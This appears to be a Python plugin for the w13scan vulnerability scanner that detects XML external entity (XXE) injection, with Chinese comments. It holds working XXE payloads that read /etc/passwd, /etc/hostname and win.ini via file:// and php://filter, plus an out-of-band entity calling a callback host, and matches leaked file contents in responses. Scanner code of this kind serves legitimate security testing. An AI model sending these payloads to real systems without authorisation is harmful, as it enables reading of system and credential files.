"""XML 外部实体注入 (w13scan 定义了 ``VulType.XXE`` 但未提供主动插件).

判定链: 服务端解析了 DOCTYPE 中的外部实体 -> 实体内容被替换进响应。因此插件在
报告前会先确认响应里**没有**残留 ``&entity;`` 字面量 —— 原样回显说明 XML 根本没被
解析, 此时任何"文件内容"匹配都不可信。

覆盖三条外带通道: ``file://`` 直接读文件、``php://filter`` base64 读 PHP 源码、
以及指向带外回调服务的盲注型实体。
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import re

from ...core.models import Finding, Severity
from .base import A05, SCOPE_ENDPOINT, Plugin, PluginContext, register, snippet

#: 文件内容特征 (与 lfi 插件同源, 只保留强特征)
FILE_SIGNS: tuple[str, ...] = (
    "root:x:0:0:", "daemon:x:", "[fonts]", "[boot loader]", "<web-app",
)

#: 实体名 -> 目标 URI
ENTITY_TARGETS: tuple[tuple[str, str], ...] = (
    ("xxe", "file:///etc/passwd"),
    ("xxe2", "file:///etc/hostname"),
    ("xxe3", "file:///c:/windows/win.ini"),
    ("xxe4", "php://filter/convert.base64-encode/resource=/etc/passwd"),
)

XML_BODY = ('<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE root [<!ENTITY {name} SYSTEM "{uri}">]>'
            '<root><data>&{name};</data></root>')

#: 形如 &name; 的未解析实体引用
UNRESOLVED_RE = re.compile(r"&[A-Za-z_][\w.-]*;")
#: 长 base64 片段 (php://filter 外带)
B64_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


@register
class Xxe(Plugin):
    """XML 外部实体注入."""

    name = "xxe"
    title = "XML 外部实体注入 (XXE)"
    category = "xxe"
    severity = Severity.HIGH
    cwe = "CWE-611"
    owasp = A05
    description = "提交带外部实体的 XML 请求体, 依据文件内容/带外回调判定实体是否被解析"
    scope = SCOPE_ENDPOINT
    references = ("https://owasp.org/www-community/vulnerabilities/"
                  "XML_External_Entity_%28XXE%29_Processing",)

    def run(self, ctx: PluginContext) -> list[Finding]:
        token = "sentinel-" + hashlib.md5(ctx.endpoint.url.encode()).hexdigest()[:10]
        targets = list(ENTITY_TARGETS) + [
            ("xxe5", f"http://{ctx.oob_host}:{ctx.oob_port}/{token}")]
        for name, uri in targets:
            body = XML_BODY.format(name=name, uri=uri)
            result = ctx.inject_body(body, "application/xml")
            if not result.status or not result.body:
                continue
            text = result.text
            if f"&{name};" in text:
                continue          # 实体未被解析, 只是原样回显 -> 无 XXE
            if ctx.oob is not None and ctx.oob.seen(token):
                return [self._finding(ctx, result, name, uri,
                                      "带外回调命中", 0.95)]
            hit = _file_content(text)
            if hit:
                return [self._finding(ctx, result, name, uri, hit, 0.95)]
        return []

    def _finding(self, ctx: PluginContext, result, name: str, uri: str,
                 evidence: str, confidence: float) -> Finding:
        return ctx.add(
            vuln_type="xxe", url=result.url, method="POST", param="XML Body",
            payload=XML_BODY.format(name=name, uri=uri),
            evidence=snippet(result.text, evidence, 60),
            severity=self.severity, confidence=confidence,
            proof=f"外部实体 {name!r} 指向 {uri!r}, 服务端解析后回显了目标内容 "
                  f"({evidence})")


def _file_content(text: str) -> str:
    """在响应里找文件内容特征 (明文或 php://filter 的 base64 外带)."""
    for sign in FILE_SIGNS:
        if sign in text:
            return sign
    for chunk in B64_RE.findall(text):
        for candidate in (chunk, chunk + "=", chunk + "==", chunk + "==="):
            try:
                decoded = base64.b64decode(candidate, validate=True).decode(
                    "utf-8", "replace")
            except (binascii.Error, ValueError):
                continue
            for sign in FILE_SIGNS:
                if sign in decoded:
                    return sign
    return ""


__all__ = ["B64_RE", "ENTITY_TARGETS", "FILE_SIGNS", "UNRESOLVED_RE", "XML_BODY", "Xxe"]
